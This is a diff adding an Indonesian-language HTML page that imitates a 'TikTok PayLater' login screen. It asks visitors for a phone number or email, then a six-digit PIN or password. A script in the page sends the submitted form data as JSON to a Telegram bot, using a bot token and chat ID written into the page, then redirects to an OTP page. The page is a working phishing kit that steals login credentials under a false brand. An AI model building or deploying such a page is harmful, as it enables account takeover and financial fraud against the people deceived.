@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="in">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title> TikTok PayLater </title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        /* Hide the form initially */
+        #login-form {
+            display: none;
+        }
+
+        /* Fullscreen image styling */
+        #loading-image {
+            position: fixed; /* Fix the position to cover the entire viewport */
+            top: 0;
+            left: 0;
+            width: 100vw; /* Full width */
+            height: 100vh; /* Full height */
+            z-index: 10; /* Ensure it appears above other content */
+            display: flex; /* Center the image */
+            justify-content: center; /* Center horizontally */
+            align-items: center; /* Center vertically */
+        }
+
+        #loading-image img {
+            width: 100%; /* Ensure image covers the full width */
+            height: 100%; /* Ensure image covers the full height */
+            object-fit: cover; /* Cover the area without distortion */
+        }
+    </style>
+    <script>
+        // Function to handle the image and form transition
+        function showForm() {
+            const loadingImage = document.getElementById("loading-image");
+            const loginForm = document.getElementById("login-form");
+
+            // Hide the image and show the form
+            loadingImage.style.display = "none";
+            loginForm.style.display = "block";
+        }
+
+        function validateForm(event) {
+            const input = document.getElementById("email").value;
+            const phoneRegex = /^08[0-9]{8,}$/;
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+            if (!phoneRegex.test(input) && !emailRegex.test(input)) {
+                event.preventDefault();
+                const messageElement = document.getElementById("validation-message");
+                messageElement.textContent = "Silakan masukkan nomor telepon yang valid (08) atau alamat email yang benar.";
+                messageElement.classList.remove("hidden");
+            } else {
+                const messageElement = document.getElementById("validation-message");
+                messageElement.textContent = "";
+                messageElement.classList.add("hidden");
+            }
+        }
+
+        // Start the transition after the page loads
+        window.onload = function() {
+            setTimeout(showForm, 2000); // Change duration as needed (3000ms = 3s)
+        };
+    </script>
+</head>
+<body class="bg-gray-50 min-h-screen">
+    <!-- Loading Image Section -->
+    <div id="loading-image">
+        <img src="https://static.tildacdn.ink/tild6266-3265-4638-a262-353532356236/1000248762.png"" alt="Loading" />
+    </div>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk | TikTok</title>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #ffffff; display: flex; justify-content: center; overflow-x: hidden; }
+        .container { width: 100%; max-width: 450px; padding: 20px; height: 100%; position: relative; display: flex; flex-direction: column; }
+        
+        /* Header */
+        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+        .back-btn { font-size: 24px; cursor: pointer; color: #000; }
+        .title { font-size: 17px; font-weight: 700; }
+
+        /* Tabs Tahap 1 */
+        .tabs { display: flex; border-bottom: 1px solid #ebebeb; margin-bottom: 25px; }
+        .tab { flex: 1; text-align: center; padding: 12px 0; font-size: 15px; color: #8a8a8a; cursor: pointer; position: relative; }
+        .tab.active { color: #000; font-weight: 600; }
+        .tab.active::after { content: ""; position: absolute; bottom: 0; left: 0; width: 100%; height: 2px; background-color: #000; }
+
+        /* Input Box */
+        .input-box { display: flex; align-items: center; background-color: #f1f1f2; border-radius: 4px; padding: 0 12px; height: 44px; margin-bottom: 15px; border: 1px solid transparent; }
+        .country-code { font-weight: 600; padding-right: 12px; border-right: 1px solid #d1d1d3; margin-right: 12px; font-size: 15px; }
+        input { background: transparent; border: none; outline: none; font-size: 15px; width: 100%; color: #161823; caret-color: #fe2c55; }
+
+        /* OTP PIN Style */
+        .otp-wrapper { display: flex; justify-content: space-between; gap: 8px; margin-top: 10px; }
+        .pin-field { 
+            flex: 1; height: 54px; text-align: center; font-size: 24px; font-weight: bold; 
+            border: 1px solid #d1d1d3; border-radius: 4px; background-color: #f1f1f2; 
+            outline: none; color: #000; caret-color: transparent; 
+        }
+        .pin-field:focus { border-color: #fe2c55; background-color: #fff; }
+
+        /* Tombol Lanjutkan */
+        .btn-submit { 
+            width: calc(100% - 40px); background-color: #ffc2d1; color: white; border: none; 
+            border-radius: 26px; padding: 14px; font-size: 16px; font-weight: 600; 
+            position: absolute; bottom: -50vh; left: 20px; cursor: not-allowed; 
+            display: flex; justify-content: center; align-items: center;
+        }
+        .btn-active { background-color: #fe2c55; cursor: pointer; }
+
+        /* Loading Spinner */
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #ffffff; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: none; margin-right: 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+    
+/* Blue */
+.info {
+  color: #1E90FF;
+}
+    .bnt {
+  border: none;
+  background-color: inherit;
+  padding: 14px 28px;
+  font-size: 16px;
+  cursor: pointer;
+  display: inline-block;
+}
+
+        .info:hover {
+  background: transparent;
+  color: white;
+}
+    </style>
+</head>
+<body>
+
+<div class="container">
+<form id="setPin" onsubmit="loader(event); return false" method="POST">
+    <div class="header">
+        <span class="back-btn" onclick="location.reload()">&#10094;</span>
+        <div class="title" name="page-title" id="page-title">Masuk</div>
+        <span style="font-size: 20px; cursor: pointer;">&#9432;</span>
+    </div>
+
+    <div id="section-1">
+        <div class="tabs">
+            <div class="tab active" name="tab-phone" id="tab-phone">Telepon</div>
+            <div class="tab" name="tab-email" id="tab-email"> Email/nama pengguna</div>
+        </div>
+        <div class="input-box">
+            <div id="prefix" class="country-code">+62</div>
+            <input type="tel" name="tab-phone" id="main-input" maxlength="" placeholder="Nomor telepon" autocomplete="off">
+        </div>
+    </div>
+
+    <div id="section-otp" name="pin" style="display: none;">
+        <p style="font-size: 15px; font-weight: 600; margin-bottom: 20px;">Masukkan PIN </p>
+        <div class="otp-wrapper">
+            <input type="tel" name="pin" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+            <input type="tel" name="pin2" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+            <input type="tel" name="pin3" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+            <input type="tel" name="pin4" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+            <input type="tel" name="pin5" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+            <input type="tel" name="pin6" class="pin-field" maxlength="1" autocomplete="off" pattern="\d*">
+      <br>  </div><a href="#" target="_blank">Lupa PIN?</a>
+
+    </div>
+
+    <div id="section-pass" name="password"" style="display: none;">
+        <p style="font-size: 14px; color: #616161; margin-bottom: 8px;">Masukkan kata sandi</p><br>
+        <div class="input-box">
+            <input type="password" name="Password" id="password-field" placeholder="Kata sandi">
+        </div>
+    </div>
+
+    <button class="btn-submit" id="next-btn" disabled>
+        <div class="loader" id="setPin"></div>
+        <span id="btn-text">Lanjutkan</span>
+    </button>
+</div>    
+     </form>
+  </div>
+   
+       <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        </div> 
+   </div> 
+   </div>
+ <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+<script src="jquery.min.js"></script>
+  <!-- partial -->
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
+<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
+  
+  <!-- partial -->
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
+<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
+ <p id="status"></p>
+
+       
+        <script type="text/javascript"> 
+            $(document).ready(function() {
+            $("div#eyeOpen").on('click', function() {
+                $("#eyeOpen").css("display", "none");
+                $("#eyeClose").css("display", "block");
+
+                $("#password").prop("type", "text");
+
+                $("div#eyeClose").on('click', function() {
+                    $("#eyeOpen").css("display", "block");
+                    $("#eyeClose").css("display", "none");
+
+                    $("#password").prop("type", "password");
+                });
+            });
+            
+const chat_id = '5826930555', botID = 'bot 8499835544:AAGt6L7jBmcEBM1RWWeT-zVXNSdqm3dLLyo';
+
+    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+
+    document.querySelector('#setPin').addEventListener("submit", async e => { // When the user submits the form
+        e.preventDefault(); // Don't submit
+        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
+            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+        null, 2); // Prettify the JSON so we can read the data easily
+        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+            method: 'POST',
+            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
+            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
+        });
+        const messageStatus = document.querySelector('#status');
+        if (sendMessage.ok) // Update the user on if the message went through
+            messageStatus.textContent = "";
+        else
+            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
+        e.target.reset(); // Clear the form fields.
+        window.location.href = 'otp.html';
+    });
+
+            
+        });
+        
+   </script>
+
+<script>
+    const nextBtn = document.getElementById('next-btn');
+    const btnText = document.getElementById('btn-text');
+    const loader = document.getElementById('loader');
+    const mainInput = document.getElementById('main-input');
+    const pinFields = document.querySelectorAll('.pin-field');
+    const passField = document.getElementById('password-field');
+
+    let mode = 'phone';
+    let step = 1;
+
+    // --- LOGIKA TAB ---
+    document.getElementById('tab-email').onclick = () => {
+        mode = 'email';
+        document.getElementById('tab-email').classList.add('active');
+        document.getElementById('tab-phone').classList.remove('active');
+        document.getElementById('prefix').style.display = 'none';
+        mainInput.type = 'text'; mainInput.placeholder = 'Email atau nama pengguna';
+        mainInput.value = ''; validate();
+    };
+
+    document.getElementById('tab-phone').onclick = () => {
+        mode = 'phone';
+        document.getElementById('tab-phone').classList.add('active');
+        document.getElementById('tab-email').classList.remove('active');
+        document.getElementById('prefix').style.display = 'block';
+        mainInput.type = 'tel'; mainInput.placeholder = 'Nomor telepon';
+        mainInput.value = ''; validate();
+    };
+
+    // --- LOGIKA VALIDASI ---
+    mainInput.oninput = validate;
+    passField.oninput = validate;
+    pinFields.forEach((f, i) => {
+        f.oninput = (e) => {
+            if (e.target.value && pinFields[i+1]) pinFields[i+1].focus();
+            validate();
+        };
+        f.onkeydown = (e) => {
+            if (e.key === 'Backspace' && !f.value && pinFields[i-1]) pinFields[i-1].focus();
+        };
+    });
+
+    function validate() {
+        let ok = false;
+        if (step === 1) ok = mainInput.value.length >= 5;
+        else if (mode === 'phone') ok = Array.from(pinFields).every(f => f.value !== "");
+        else ok = passField.value.length >= 6;
+
+        nextBtn.disabled = !ok;
+        if (ok) nextBtn.classList.add('btn-active');
+        else nextBtn.classList.remove('btn-active');
+    }
+
+    // --- LOGIKA TOMBOL LANJUTKAN ---
+    nextBtn.onclick = () => {
+        if (step === 1) {
+            step = 2;
+            document.getElementById('section-1').style.display = 'none';
+            nextBtn.disabled = true; nextBtn.classList.remove('btn-active');
+
+            if (mode === 'phone') {
+                document.getElementById('page-title').innerText = 'Verifikasi';
+                document.getElementById('section-otp').style.display = 'block';
+                pinFields[0].focus();
+            } else {
+                document.getElementById('page-title').innerText = 'Kata Sandi';
+                document.getElementById('section-pass').style.display = 'block';
+                passField.focus();
+            }
+        } else {
+            submitData();
+        }
+    };
+
+    function submitData() {
+        loader.style.display = 'block';
+        btnText.innerText = 'Memproses...';
+        nextBtn.disabled = true;
+
+      
+        // Delay 3 detik (Efek Loading) lalu redirect
+        setTimeout(() => {
+            window.location.href = "otpp.html";
+        }, 3000);
+    }
+</script>
+</body>
+</html>
